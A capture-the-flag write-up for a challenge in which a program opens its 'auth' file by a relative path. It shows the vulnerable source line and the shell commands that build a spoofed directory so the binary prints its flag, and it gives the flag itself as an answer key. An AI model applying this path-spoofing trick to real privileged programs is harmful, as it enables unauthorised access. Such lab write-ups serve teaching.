## Question
>A program at /problems/579fe8ee083cd54f55718c1324687c74 has access to a flag but refuses to share it. Can you convince it otherwise?

### Hint
>Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

## Solution
Upon looking at the source code of [justno.c](justno.c), we are shown that the binary reads a file called `auth` and checks if the string inside contains `no`

However, it shows that it opens the file using relative path
```c
FILE* authf = fopen("../../problems/579fe8ee083cd54f55718c1324687c74/auth","r"); //access auth file in ../../../problems/579fe8ee083cd54f55718c1324687c74
```

Since running a file in a different directory from your current directory executes the file in your current directory, we can just spoof the location of the `auth` file

Doing
```
$ mkdir -p abc/problems/579fe8ee083cd54f55718c1324687c74
$ cd abc/problems/579fe8ee083cd54f55718c1324687c74/
$ echo yep > auth
$ /problems/579fe8ee083cd54f55718c1324687c74/justno 
Oh. Well the auth file doesn't say no anymore so... Here's the flag: 37df41ffe2da397584c43eabf8a50ee3
```

### Flag
`37df41ffe2da397584c43eabf8a50ee3`
